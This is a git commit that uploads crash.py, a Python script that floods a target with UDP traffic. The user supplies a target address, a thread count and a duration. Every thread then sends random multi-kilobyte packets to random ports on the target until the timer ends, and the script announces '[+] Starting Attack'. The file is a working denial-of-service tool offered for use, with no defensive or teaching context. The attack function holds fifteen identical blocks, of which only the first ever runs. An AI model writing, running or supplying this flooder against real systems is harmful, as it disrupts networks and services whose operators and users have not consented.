6aac4530be70f64b0dc1186dd80379c1d370a3b4
CODEBLOXE <100864307+CODEBLOXE@users.noreply.github.com>
2022-11-24 13:50:43 +0200

    Add files via upload

---
+++ crash.py
@@ -0,0 +1,166 @@
+import socket, time, random, threading, sys
+
+try:
+    Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])
+except IndexError:
+    print("\n[+] Usage: python " + sys.argv[0] + ' <Target> <Threads> <Timer>')
+
+Timeout = time.time() + 1 * Timer
+
+def Attack():
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+        
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    try:
+        BYTES = random._urandom(1024)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            dport = random.randint(22,55500)
+            sock.sendto(BYTES*random.randint(5,22),(Target,dport))
+        return
+    except Exception as Error:
+        print(Error)
+
+    
+print("\n[+] Starting Attack")
+
+for _ in range(0, Threads):
+    threading.Thread(target=Attack).start()
+
